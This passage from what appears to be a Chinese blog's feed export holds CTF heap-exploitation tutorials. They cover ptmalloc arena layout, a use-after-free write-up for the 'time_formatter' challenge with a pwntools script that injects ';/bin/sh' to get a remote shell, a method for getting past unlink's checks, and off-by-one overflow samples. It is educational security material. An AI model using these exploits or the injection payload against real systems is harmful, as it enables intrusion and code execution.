class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p>第一次申请后，从下面的输出可以看出，堆段被建立了，并且它就紧邻这数据段，这说明<br>malloc的背后是brk函数来实现的。同时，需要注意的是，我们虽然只是申请了1000个字节，<br>但是我们却得到了 0x0806c000-0x0804b000=0x21000 个字节的堆。这说明虽然程序只是<br>向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的<br>话，就避免了多次内核态与用户态的切换，提高了程序的效率。我们称这一块连续的内存<br>区域为arena。此外，我们称由主线程申请的内存为main_arena。后续的申请的内存会一直<br>从这个arena中获取，直到空间不足。当arena空间不足时，它可以通过增加brk的方式来增加<br>堆的空间。类似的，arena也可以通过减小brk来缩小自己的空间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p>在主线程释放内存后，我们从下面的输出可以看出，其对应的arena并没有进行回收，而是<br>交由glibc来进行管理。当后面程序再次申请内存时，在glibc中管理的内存充足的情况下，<br>glibc就会根据堆分配的算法来给程序分配相应的内存。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p>在第一个线程malloc之前，我们可以看到并没有出现与线程1相关的堆，但是出现了与线程1<br>相关的栈。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">Before malloc <span class="keyword">in</span> thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p>在第一个线程malloc后，我们可以从下面输出看出线程1的堆段被建立了。而且它所在的位<br>置为内存映射段区域，同样大小也是132KB(b7500000-b7521000)。因此这表明该线程申请<br>的堆时，背后对应的函数为mmap函数。同时，我们可以看出实际真的分配给程序的内存为<br>1M(b7500000-b7600000)。而且，只有132KB的部分具有可读可写权限，这一块连续区域<br>成为thread arena。</p><p>注意：<br>当用户请求的内存大于128KB时，并且乜有任何arena有足够的空间时，那么系统就会执行<br>mmap函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">Before malloc <span class="keyword">in</span> thread 1</span><br><span class="line">After malloc and before free <span class="keyword">in</span> thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p>在第一个线程释放内存后，我们可以从下面的输出看到，这样释放内存同样不会把内存重新<br>给系统。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">Before malloc <span class="keyword">in</span> thread 1</span><br><span class="line">After malloc and before free <span class="keyword">in</span> thread 1</span><br><span class="line">After free <span class="keyword">in</span> thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界堆溢出UAF_time_formatter</title>
    <link href="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/"/>
    <url>/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/</url>
    
    <content type="html"><![CDATA[<h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>在linux shell中，假如有如下语句，这就是shell注入方面<br>echo “;ls;cat 1.txt;/bin/sh;”<br>则 ls 、cat 1.txt 、/bin/sh 这三个命令就会一次执行，这也是本题突破的关键</p><h3 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h3><p>C语言或C++申请内存后，用free 或 delete 释放堆后，指针的值还在，如果不手动设置为<br>NULL，就可以被我们利用。</p><p>堆内存的分配有规律，看如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++) &#123;</span><br><span class="line"><span class="keyword">char</span> *c = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,(<span class="keyword">long</span>)c);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,(<span class="keyword">long</span>)c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在Ubuntu上用gcc编译后运行此代码，输出的地址全部一样，这说明，当前一个堆释放<br>后，新创建的堆的地址就是前一个堆的地址。</p><p>那么，我们来看题<br>①选项5退出时，释放了内存，但是并没有将指针设置为NULL，因此指针仍指向原来的那个地址<br><img src="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/1.png" alt="1.png"><br>②选项4，有system，这里判断ptr是否为空，于是我们在退出时，选择不退出，这样我们释放了<br>第一个堆，然后我们在选项3中输入注入语句，创建的堆的地址就是第一个堆的地址，然后我们在<br>选项3中输入注入语句，创建的堆的地址就是第一个堆的地址，也就是Ptr的内容，最后再选择<br>4，执行getshell。这就是UAF（use after free）漏洞，通过UAF漏洞使得set_time_zone分配<br>得到的是set_format释放掉的内存。<br><img src="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/2.png" alt="2.png"><br>这样，格式化字符串后的command就是<br>/bin/date -d @ “;/bin/sh”</p><p>于是我们的脚本就这样写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&#x27;./pwnh9&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">57042</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Are you sure you want to exit (y/N)?&#x27;</span>,<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Time zone:&#x27;</span>,<span class="string">&quot;&#x27;;/bin/sh&#x27;&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Unlink</title>
    <link href="/2021/06/11/Unlink/"/>
    <url>/2021/06/11/Unlink/</url>
    
    <content type="html"><![CDATA[<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><p>我们在利用unlink所造成的漏洞是，其实就是对chunk进行内存布局，然后借助unlink操作<br>来达成修改指针的效果。</p><p>我们先来简单回顾一下unlink的目的与过程，其目的是把一个双向链表中的空闲块拿出来<br>（例如free时和目前物理相邻的free chunk进行合并）。其基本的过程如下：<br><img src="/2021/06/11/Unlink/1.png" alt="1.png"><br>下面我们首先介绍一下unlink最初没有防护时的利用方法，然后介绍目前利用Unlink的方式。</p><h3 id="古老的unlink"><a href="#古老的unlink" class="headerlink" title="古老的unlink"></a>古老的unlink</h3><p>最初unlink实现的时候，其实是没有对chunk的size检查和双向链表检查的，即没有如下检查<br>代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>这里我们以32位为例，假设堆内存最初的布局是下面的样子<br><img src="/2021/06/11/Unlink/2.png" alt="2.png"><br>现在有物理空间连续的两个chunk（Q,Nextchunk），其中Q处于使用状态、Nextchunk<br>处于释放状态。那么如果我们通过某种方式（比如溢出）将Nextchunk的fd和bk指针修改为<br>指定的值。则当我们free(Q)时<br>①glibc判断这个块是small chunk<br>②判断向前合并，发现前一个chunk处于使用状态，不需要向前合并<br>③判断向后合并，发现后一个chunk处于空闲状态，需要合并<br>④继而对Nextchunk采取unlink操作<br>那么unlink具体执行的效果是什么样子呢？<br>①FD=P-&gt;fd = target addr -12<br>②BK=P-&gt;bk = expect value<br>③FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value<br>④BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12<br>看起来我们似乎可以通过unlink直接实现任意地址读写目的，但是我们还是需要确保expect<br>value+8的地址具有可写权限。</p><p>比如说我们将target addr 设置成某个got表项，那么当程序调用对应的Libc函数时，就会直接<br>执行我们设置的值（expect value）处的代码。需要注意的是，expect value+8处的值被破坏<br>了，需要想办法绕过。</p><h3 id="当前的unlink"><a href="#当前的unlink" class="headerlink" title="当前的unlink"></a>当前的unlink</h3><p>我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们对比一下<br>fd和bk的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>此时<br>①FD-&gt;bk = target addr - 12 + 12=target_addr<br>②BK-&gt;fd = expect value + 8<br>那么我们上面所利用的修改GOT表项的方法就可能不可用了。但是我们可以通过伪造的方式<br>绕过这个机制。<br>首先我们通过覆盖，将nextchunk的FD指针指向了fakeFD，将nextchunk的BX指针指向了<br>fakeBK。那么为了通过验证，我们需要<br>①fakeFD -&gt; bk == P &lt;=&gt; *(fakeFD + 12) == P<br>②fakeBK -&gt; fd == P &lt;=&gt; *(fakeBK + 8) == P<br>当满足上述两个式子时，可以进入unlink环节，进行如下操作：<br>①fakeFD -&gt; bk = fakeBK &lt;=&gt; <em>(fakeFD + 12) = fakeBK<br>②fakeBK -&gt; fd = fakeFD &lt;=&gt; <em>(fakeBK + 8) = fakeFD<br>如果让fakeFD+12和fakeBK+8指向同一个指向P的指针，那么：<br>①</em>P = P - 8<br>②</em>P = P - 12<br>即通过此方式，P的指针指向了比自己低12的地址处。此方法虽然不可以实现任意地址写，<br>但是可以修改指向chunk的指针，这样的修改是可以达到一定的效果的。</p><p>如果我们想要使得两者都指向P，只需要按照如下方式修改即可<br><img src="/2021/06/11/Unlink/3.png" alt="3.png"><br>需要注意的是，这里我们并没有违背下面的约束，因为P在unlink前是指向正确的chunk的<br>指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">     malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br></pre></td></tr></table></figure><p><strong>此外，其实如果我们设置next chunk的fd和bk均为nextchunk的地址也是可以绕过上面的<br>检测的。但是这样的话，并不能达到修改指针内容的效果。</strong></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><p>1、UAF，可修改free状态下smallbin或是unsorted bin 的fd和Bk指针<br>2、一直位置存在一个指针指向可进行UAF的chunk</p><h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p>使得已指向UAF chunk的指针ptr变为ptr-0x18</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>设指向可UAF chunk的指针的地址为ptr<br>①修改fd为 ptr-0x18<br>②修改bk为ptr-0x10<br>③触发unlink<br>ptr处的指针会变为Ptr-0x18</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Off-by-One</title>
    <link href="/2021/06/11/off-by-one/"/>
    <url>/2021/06/11/off-by-one/</url>
    
    <content type="html"><![CDATA[<h1 id="堆溢出之off-by-one"><a href="#堆溢出之off-by-one" class="headerlink" title="堆溢出之off by one"></a>堆溢出之off by one</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>严格来说off-by-one漏洞是一种特殊的溢出漏洞，off by one 指向缓冲区中写入时，写入<br>的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p><h3 id="off-by-one-漏洞原理"><a href="#off-by-one-漏洞原理" class="headerlink" title="off by one 漏洞原理"></a>off by one 漏洞原理</h3><p>off by one是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，<br>当然也不排除写入的size就只多了一个字节的情况。其中边界验证不严通常包括：</p><p>①使用循环语句向堆块中写入数据时，循环的次数设置错误导致多写入了一个字节<br>②字符串操作不合适</p><p>一般来说，单字节溢出被认为是难以利用的，但是因为Linux的堆管理机制ptmalloc验证的<br>松散性，基于linux堆的off-by-one漏洞利用起来并不复杂，并且威力强大。此外，需要说明<br>的一点是off-by-one是可以基于各种缓冲区的，比如栈、bss段等，但在堆上的off by one<br>是CTF中比较常见的。</p><h3 id="off-by-one利用思路"><a href="#off-by-one利用思路" class="headerlink" title="off-by-one利用思路"></a>off-by-one利用思路</h3><p>1、溢出字节为可控制字节：通过修改大小造成结构之间出现重叠，从而泄露出其他块数据，<br>或是覆盖其他块数据。也可使用NULL字节溢出的方法。</p><p>2、溢出字节为NULL字节：在size为0x100的时候，溢出NULL字节可以使得prev_in_use位<br>被清，这样前块会被认为是free块。<br>(1)这时可以选择使用unlink方法进行处理<br>(2)另外，这时prev_size域就会启用，就可以伪造prev_size，从而造成块之间发生重叠。此<br>方法的关键在于unlink的时候没有检查按照prev_size找到的块的大小与prev_size是否一致。</p><p>示例1<br>C</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>my_gets函数导致了一个off by one 漏洞，原因是for循环的边界没有控制好导致写入多执行<br>了一次，这也被称为栅栏错误。</p><p>我们使用gdb对程序进行调试，在进行输入前可以看到分配的两个用户区域为16字节的堆块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>当我们执行my_gets进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的prev_size<br>域print ‘A’*17</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>示例2<br>第二种常见的导致off-by-one的场景就是字符串操作了，常见的原因就是字符串的结束符<br>计算有误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span 